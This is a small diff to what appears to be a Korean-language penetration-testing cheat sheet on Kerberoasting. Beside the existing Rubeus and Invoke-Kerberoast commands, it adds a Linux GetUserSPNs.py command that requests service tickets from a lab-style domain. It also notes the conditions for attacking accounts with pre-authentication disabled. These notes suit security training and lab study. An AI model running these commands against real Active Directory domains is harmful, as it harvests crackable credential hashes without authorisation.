@@ -66,6 +66,11 @@ Invoke-Kerberoast
 .\Rubeus.exe kerberoast /nowrap /tgtdeleg
 ```
 
+### Linux
+```bash
+GetUserSPNs.py inlanefreight.local/pixis -request
+```
+
 #### Without Password
 - `Pre-auth`가 비활성화 되어 있는 상태.
 - 해당 계정에 최소 하나의 SPN이 존재.
